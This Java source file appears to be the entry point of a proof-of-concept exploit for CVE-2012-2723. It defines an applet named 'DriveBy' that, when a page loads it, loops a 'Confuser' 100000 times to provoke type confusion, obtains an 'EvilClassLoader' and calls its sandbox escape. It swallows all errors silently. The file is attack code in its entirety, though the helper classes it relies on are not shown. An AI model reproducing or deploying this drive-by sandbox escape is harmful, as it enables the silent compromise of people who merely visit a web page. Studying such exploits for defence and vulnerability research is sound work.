package me.ethaniel.cve20122723;

import java.applet.Applet;

public class DriveBy extends Applet {
    static EvilClassLoader appletCL;

    @Override
    public void start() {
        try {
            Confuser confuser = new Confuser();
            for (int i = 0; i < 100000; i++)
                confuser.confuse(null);
            Thread.sleep(1000);
            appletCL = confuser.confuse(getClass().getClassLoader());
            EvilClassLoader.escapeSandbox();
        } catch (Exception e) { }
    }
}